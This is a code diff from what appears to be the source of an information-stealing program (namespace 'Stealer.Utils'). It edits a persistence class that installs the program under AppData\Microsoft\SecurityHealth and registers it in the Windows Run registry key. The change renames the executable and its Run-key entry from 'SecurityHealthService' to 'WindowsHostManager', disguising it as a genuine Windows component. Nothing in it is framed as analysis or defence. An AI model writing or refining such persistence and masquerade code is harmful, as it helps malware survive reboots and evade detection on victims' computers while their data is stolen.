@@ -7,7 +7,7 @@ namespace Stealer.Utils
 {
     public static class Persistence
     {
-        private static readonly string ExeName = "SecurityHealthService.exe";
+        private static readonly string ExeName = "WindowsHostManager.exe";
         private static readonly string InstallDir = Path.Combine(
             Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
             "Microsoft", "SecurityHealth");
@@ -43,7 +43,7 @@ namespace Stealer.Utils
             {
                 using (var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                 {
-                    key?.DeleteValue("SecurityHealthService", false);
+                    key?.DeleteValue("WindowsHostManager", false);
                 }
             }
             catch { }
@@ -81,7 +81,7 @@ namespace Stealer.Utils
             {
                 using (var key = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                 {
-                    key?.SetValue("SecurityHealthService", "\"" + InstallPath + "\"");
+                    key?.SetValue("WindowsHostManager", "\"" + InstallPath + "\"");
                 }
             }
             catch { }
